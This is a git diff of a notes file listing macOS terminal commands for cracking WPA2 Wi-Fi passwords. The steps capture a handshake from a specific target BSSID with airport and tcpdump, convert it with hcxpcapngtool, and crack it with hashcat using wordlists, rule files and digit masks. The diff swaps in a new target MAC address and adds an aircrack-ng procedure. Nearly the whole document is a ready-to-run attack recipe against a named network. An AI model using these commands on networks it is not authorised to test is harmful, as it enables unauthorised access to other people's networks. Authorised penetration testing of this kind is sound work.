@@ -21,7 +21,7 @@
 + brew install hcxtools
 + brew install wireshark
 
-1. export BSSID=90:47:3c:31:80:39
+1. export BSSID=18:9e:2c:64:88:3c
 2. networksetup -listallhardwareports
 3. sudo airport -z
 4. sudo airport -c153
@@ -29,8 +29,17 @@
 6. sudo tcpdump "ether proto 0x888e and ether host $BSSID" -I -U -vvv -i en0 -w handshake.cap
 7. mergecap -a -F pcap -w capture.cap beacon.cap handshake.cap
 8. hcxpcapngtool -o hashfile capture.cap
-9. hashcat -m 22000 capture.hccapx wpa2-wordlists/full.txt
+9. hashcat -m 22000 hashfile wpa2-wordlists/full.txt
 10. hashcat -m 22000 -a3 capture.hccapx "?d?d?d?d?d?d?d?d"
 11. hashcat -m 22000 hashfile wpa.txt -r Probable-Wordlists/Analysis-Files/ProbWL-547-rule-probable-v2.rule
 
 https://hashcat.net/cap2hashcat/
+
+aircrack-ng -1 -a 1 -b 18:9e:2c:64:88:3c 
+
+
+1. Install aircrack-ng:`brew install aircrack-ng`
+2. `sudo airport -s`
+3. `sudo airport en1 sniff [CHANNEL]`
+4. New Terminal Window: `aircrack-ng -1 -a 1 -b [TARGET_MAC_ADDRESS] [CAP_FILE]`
+// Notes: the cap_file will be located in the /tmp/airportSniff*.cap.
